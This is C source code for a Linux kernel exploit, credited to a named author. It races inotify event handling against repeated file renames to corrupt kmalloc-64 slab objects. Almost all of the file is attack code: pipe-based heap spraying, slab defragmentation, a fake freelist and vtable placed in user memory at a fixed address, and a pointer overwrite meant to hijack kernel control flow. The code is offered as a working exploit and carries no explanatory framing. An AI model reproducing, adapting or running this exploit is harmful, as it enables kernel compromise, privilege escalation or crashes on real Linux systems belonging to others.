/*
 * Original exploit written by
 * Jeremy Huang (jeremyhcw@gmail.com)
*/

//Trigger inotify event by file open and rename to trigger the vulnerability and exploit

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <string.h>
#include <signal.h>
#include <sys/eventfd.h>
#include <sys/inotify.h>
#include <sys/mman.h>
#include <ctype.h>
#include <errno.h>
#include <err.h>
#include <poll.h>
#include <unistd.h>
#include "libexp.h"

// target cache kmalloc-64
pthread_t notify_thread, rename_thread, openclose_thread;
volatile int stop = 0;
char orig_name[2];
char *payload_name;
// some gaps need to be filled, so it's 3
#define PIPE_LEN 3
int pipe_array[0x100][2];
u64 *fake_heap;
u64 *fake_vtable;
volatile int *stage;
#define CRASH_IP 0xffffffffdeadbeef
#define PTR 0xffffffff8240febf
#define IDENTIFY_OFFSET 0x032340

static void handle_events(int fd, int *wd, int argc, char* argv[])
{
   /* Some systems cannot read integer variables if they are not
 	  properly aligned. On other systems, incorrect alignment may
 	  decrease performance. Hence, the buffer used for reading from
 	  the inotify file descriptor should have the same alignment as
 	  struct inotify_event. */

   char buf[4096]
	__attribute__ ((aligned(__alignof__(struct inotify_event))));
   const struct inotify_event *event;
   int i;
   ssize_t len;
   char *ptr;

   /* Loop while events can be read from inotify file descriptor. */

   for (;;) {

	   /* Read some events. */

	   len = read(fd, buf, sizeof buf);
	   if (len == -1 && errno != EAGAIN) {
		   perror("read");
		   exit(EXIT_FAILURE);
	   }

	   /* If the nonblocking read() found no events to read, then
		  it returns -1 with errno set to EAGAIN. In that case,
		  we exit the loop. */

	   if (len <= 0)
		   break;

	   /* Loop over all events in the buffer */

	   for (ptr = buf; ptr < buf + len;
			   ptr += sizeof(struct inotify_event) + event->len) {

		   event = (const struct inotify_event *) ptr;

		   /* Print event type */
/*
		   if (event->mask & IN_OPEN)
			   printf("IN_OPEN: ");
		   if (event->mask & IN_CLOSE_NOWRITE)
			   printf("IN_CLOSE_NOWRITE: ");
		   if (event->mask & IN_CLOSE_WRITE)
			   printf("IN_CLOSE_WRITE: ");
		   if (event->mask % IN_ACCESS)
			   printf("IN_ACCESS: ");
*/
		   /* Print the name of the watched directory */

		   for (i = 1; i < argc; ++i) {
			   if (wd[i] == event->wd) {
				   //printf("%s/", argv[i]);
				   break;
			   }
		   }

		   /* Print the name of the file */

		   //if (event->len && strcmp(event->name, orig_name)) {
		   //	printf("%s() event->name : %s, event->len : %d\n",__func__, event->name, event->len);

		   //	if(strlen(event->name) != strlen(payload_name)) {
		   // 		printf("Detected overwrite!!!\n");
		   // 		stop = 1;
		   // 		break;
		   //	}
		   //}
	   }
   }
}

static void* notify_thread_func(void* arg) 
{
   char buf;
   int fd, i, poll_num;
   int *wd;
   nfds_t nfds;
   struct pollfd fds[2];

   int argc = 2;
   char *argv[] = { NULL, "test_dir", NULL};

   /* Create the file descriptor for accessing the inotify API */

   fd = inotify_init1(IN_NONBLOCK);
   if (fd == -1) {
	   perror("inotify_init1");
	   exit(EXIT_FAILURE);
   }

   /* Allocate memory for watch descriptors */

   wd = calloc(argc, sizeof(int));
   if (wd == NULL) {
	   perror("calloc");
	   exit(EXIT_FAILURE);
   }

   /* Mark directories for events
	  - file was opened
	  - file was closed */

   for (i = 1; i < argc; i++) {
	   wd[i] = inotify_add_watch(fd, argv[i],
								 IN_OPEN | IN_CLOSE| IN_ACCESS);
	   if (wd[i] == -1) {
		   fprintf(stderr, "Cannot watch '%s'\n", argv[i]);
		   perror("inotify_add_watch");
		   exit(EXIT_FAILURE);
	   }
   }

   /* Prepare for polling */

   nfds = 2;

   /* Console input */

   fds[0].fd = STDIN_FILENO;
   fds[0].events = POLLIN;

   /* Inotify input */

   fds[1].fd = fd;
   fds[1].events = POLLIN;

   printf("Listening for events.\n");
   while (1) {
	   poll_num = poll(fds, nfds, -1);
	   if (poll_num == -1) {
		   if (errno == EINTR)
			   continue;
		   perror("poll");
		   exit(EXIT_FAILURE);
	   }

	   if (poll_num > 0) {

		   if (fds[1].revents & POLLIN) {

			   handle_events(fd, wd, argc, argv);
		   }
	   }
   }

   close(fd);

   free(wd);
   return NULL;
}

void spray_pipe(int num)
{
	if(num > 0x100) num = 0x100;
	for(int i=0; i<num; i++) {
		if(pipe(pipe_array[i])) error_out("fail to create pipe");
		write(pipe_array[i][1], "AAAAAAAA", 0x10);
	}
}

void clean_pipe(int num)
{
	if(num > PIPE_LEN) num = PIPE_LEN;
	for(int i=0; i<num; i++) {
		close(pipe_array[i][0]);
		close(pipe_array[i][1]);
	}
}

void *call_rename(void *args)
{
	char origname[1024];
	char longname[1024];

	//set_cpu(1);

	// create shortname which is the initial name
	snprintf(origname, sizeof(origname)-1, "test_dir/%s", orig_name);
	printf("alloc_len : %ld\n", 48 + strlen(orig_name)+1);

	// create longname which is the payload
	snprintf(longname, sizeof(longname)-1, "test_dir/%s", payload_name);

	// looping rename to race with inotify_handle_event
	while(!stop) {
		if (rename(origname,longname)<0) perror("rename1");
		if (rename(longname,origname)<0) perror("rename2");
	}

	printf("call_rename done.\n");
}

void spray_func(void)
{
	while(*stage == 0);

	spray_pipe(PIPE_LEN);

	while(*stage == 1);

	for(int i=0; i<PIPE_LEN; i++) {
		write(pipe_array[i][1], NULL, 0x10);
	}
}

void prepare_freelist(void)
{
	for(int i=0; i<10; i++) {
		fake_vtable[i] = CRASH_IP;
	}
	
	// prepare freelist in fake slab
	u64 cur = 0x000000ffffffff00;
	u64 next;
	for(int i=0; i<10; i++) {
		next = cur + 0x40;
		*(u64 *)cur = next;
		cur = next;
	}
}


void payload_setup(void)
{
	char tmp_name[0x400];

	// prepare original name
	memset(orig_name, '0', sizeof(orig_name)-1);

	// prepare name payload
	memset(tmp_name, 0, sizeof(tmp_name));
	memset(tmp_name, 'B', 20);
	*(long *)(&tmp_name[20]) = PTR;
	if(asprintf(&payload_name, "%s", tmp_name) < 0)
		error_out("fail to setup payload");

	// prepare exploit payload, memory injection
	fake_heap = (u64 *)umem_alloc((void *)(0x000000ffffffff00 & 0xfffffffffffff000), 0x10000);
	fake_vtable = (u64 *)((u64)fake_heap + 0x4000);
	prepare_freelist();

	stage = (int *)umem_alloc(NULL, 0x1000);

	//// launch subprocesses
	//for(int i=0; i<cpu_num; i++) {
	//	for(int j=0; j<5; j++) {
	//		if(!clean_fork()) {
	//			set_cpu(i);
	//			spray_func();
	//			while(1);
	//		}
	//	}
	//}
}

void prepare_pipe_spray(void)
{
	int *flags = (int *)mmap((void *)0x30000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANON | MAP_FIXED, -1, 0);
	memset(flags, 0, 0x1000);
	for(int i=0; i<4; i++) {
		if(!clean_fork()) {
			spray_pipe(0x100);
			flags[i] = 1;
			while(1);
		}
	}
	// wait for all flags are set
	for(int i=0; i<4; i++) {
		volatile int *ptr = &flags[i];
		while(!*ptr);
	}
}

void context_setup(void)
{
	int ret;
	char buf[1024];
	if(chdir("/tmp") < 0) error_out("fail to cd /tmp");

	// create exploit folder
	system("rm -rf test_dir ; mkdir test_dir");

	// create victim file
	snprintf(buf, sizeof buf, "touch test_dir/%s", orig_name);
	system(buf);

	// start notify thread
	ret = pthread_create(&notify_thread, NULL, notify_thread_func, NULL);
	if(ret < 0) error_out("fail to start notify_thread");

	prepare_pipe_spray();

	// create a thread in the background open/close the file so that it generates
	// a lot of notify events and make inotify_handle_event called frequently
	if(pthread_create(&rename_thread, NULL, call_rename, NULL) < 0)
		error_out("pthread_create on call_rename failed");
}

void exploit(void)
{
	char origname[1024];

	//set_cpu(0);

	snprintf(origname, sizeof origname, "test_dir/%s", orig_name);

	defragment(64, 100);
	while(!stop) {
		//ts_fence();
		defragment(64, 2);
		int fd = open(origname, O_RDWR);

		nonsense();

		// try exploitation
		spray_pipe(PIPE_LEN);
		u64 *addr = (u64 *)fake_heap+0xf00/8 + 2;
		for(int i=0; i<10; i++) {
			u64 value = *addr;
			if((value & 0xffffff) == IDENTIFY_OFFSET) {
				*addr = (u64)fake_vtable;
				stop = 1;
				break;
			}
			addr += 0x40/8;
		}
		for(int i=0; i<PIPE_LEN; i++) {
			write(pipe_array[i][1], NULL, 0x10);
		}

		// clean up
		close(fd);
		clean_pipe(PIPE_LEN);

		stress_all_caches();
	}

   // cleanup useless threads
	pthread_join(rename_thread, NULL);
	pthread_join(notify_thread, NULL);

	sleep(5);
}

void main(void) 
{
	payload_setup();
	context_setup();
	exploit();
}
